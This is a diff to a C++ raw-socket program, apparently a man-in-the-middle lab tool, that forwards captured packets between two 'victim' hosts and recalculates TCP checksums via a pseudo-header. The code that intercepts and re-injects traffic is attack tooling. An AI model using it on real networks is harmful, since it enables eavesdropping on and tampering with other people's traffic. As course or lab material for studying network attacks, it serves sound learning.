@@ -18,6 +18,15 @@ uint32_t victim2IP;
 uint32_t attackerIP;
 int rawSocket;
 
+typedef struct PseudoHeader
+{
+    unsigned long int sourceIP;
+    unsigned long int destIP;
+    unsigned char reserved;
+    unsigned char protcol;
+    unsigned short int segmentLength;
+}PseudoHeader;
+
 void printPacket(unsigned char* buf, int bufSize)
 {
     cout<<"--------packet starts---------"<<endl;
@@ -220,20 +229,65 @@ void forwardPacket(unsigned char* buf, int bufSize)
         memcpy(ethHeader->h_dest,vicitim1MAC,6);
     }
 
-    struct iphdr *ipHeader = (struct iphdr*)(myPacket + sizeof(struct ethhdr));
-    ipHeader->ttl = ipHeader->ttl - 1;
-    ipHeader->check = 0;
-    ipHeader->check = computeIPChecksum((unsigned char*)ipHeader,ipHeader->ihl*4);
+    struct iphdr *ipHeader = (struct iphdr *)(myPacket + sizeof(struct ethhdr));
+    // ipHeader->ttl = ipHeader->ttl - 1;
+    // ipHeader->check = 0;
+    // ipHeader->check = (computeIPChecksum((unsigned char *)ipHeader,ipHeader->ihl*4));
+
+    struct tcphdr *tcpHeader = (struct tcphdr *)(myPacket + sizeof(struct ethhdr) + ipHeader->ihl*4);
+    tcpHeader->check = 0;
+    
+    // calculating tcp checksum
+    int segmentLength = ntohs(ipHeader->tot_len) - ipHeader->ihl*4;
+    cout<<"segment Length: "<<segmentLength<<endl;
+    int pseudoAndTCPHeaderLength = sizeof(PseudoHeader) + segmentLength;
+    cout<<"Header Length: "<<pseudoAndTCPHeaderLength<<endl; 
+    unsigned char *hdr = new unsigned char[pseudoAndTCPHeaderLength];
+
+    PseudoHeader *pseudoHeader = (PseudoHeader *)hdr;
+    pseudoHeader->sourceIP = ipHeader->saddr;
+    pseudoHeader->destIP = ipHeader->daddr;
+    pseudoHeader->reserved = 0;
+    pseudoHeader->protcol = ipHeader->protocol;
+    pseudoHeader->segmentLength = htons(segmentLength);
+
+    memcpy((hdr+sizeof(PseudoHeader)),(void *)tcpHeader,tcpHeader->doff*4);
+    
+    unsigned char* payload;
+    int payloadLength = 0;
+    payload = buf + sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4;
+    payloadLength = bufSize - (sizeof(struct ethhdr) + ipHeader->ihl * 4 + tcpHeader->doff * 4);
+    cout<<"payload length: "<<payloadLength<<endl;
+    memcpy((hdr+sizeof(PseudoHeader)+tcpHeader->doff*4),payload,payloadLength);
+    
+    
+    tcpHeader->check = (computeIPChecksum((unsigned char *)hdr,pseudoAndTCPHeaderLength));
+    cout<<"tcp header checksum"<<endl;
+    // cout<<tcpHeader->check<<endl;
+    // printf("%x\n",tcpHeader->check);
+
+    // printf("%x\n",ntohs(tcpHeader->check));
+
+
+    printf("%x\n",htons(tcpHeader->check));
+    
+    
+    
+    
+    
+    
+    
     // cout<<"calling parse packet"<<endl;
     // parsePacket(myPacket,bufSize);
     // cout<<"forward closing"<<endl;
     cout<<"sending"<<endl;
-    parsePacket(myPacket,bufSize);
+    // parsePacket(myPacket,bufSize);
+    // printUnsignedCharArr("packet in hex:\n",myPacket,bufSize);
     cout<<"total sent: "<<write(rawSocket, myPacket, bufSize)<<endl;
     cout<<"forwarding completed"<<endl;
 
     
-
+    delete[] hdr;
     delete[] myPacket;
     
 }
@@ -416,6 +470,10 @@ int main()
     }
     cout<<"Socket opened successfully"<<endl;
     int totalCaptured = 0;
+
+    // unsigned char temp111[] =  {0x02, 0x42, 0x0a, 0x09, 0x00, 0x69, 0x02, 0x42, 0x0a, 0x09, 0x00, 0x05, 0x08, 0x00, 0x45, 0x00, 0x00, 0x3d, 0xcc, 0xc8, 0x40, 0x00, 0x40, 0x06, 0x59, 0xd6, 0x0a, 0x09, 0x00, 0x05, 0x0a, 0x09, 0x00, 0x06, 0xbc, 0x9a, 0x23, 0x82, 0x73, 0x89, 0x6f, 0xde, 0xa2, 0x09, 0x12, 0x7c, 0x80, 0x18, 0x01, 0xf6, 0x14, 0x4c, 0x00, 0x00, 0x01, 0x01, 0x08, 0x0a, 0xe0, 0xc0, 0x9c, 0xc4, 0x7d, 0xd7, 0x6a, 0x1b, 0x6b, 0x69, 0x6c, 0x6c, 0x20, 0x6d, 0x65, 0x68, 0x0a};
+    // int templen = 75;
+    // filterPacket(temp111,templen);
     while(true)
     {
         struct sockaddr pktInfo;
@@ -432,6 +490,7 @@ int main()
             // parsePacket(pktBuf,sizeOfPkt);
         }
     }
+
     close(rawSocket);
     cout<<"Socket closed"<<endl;
     return 0;
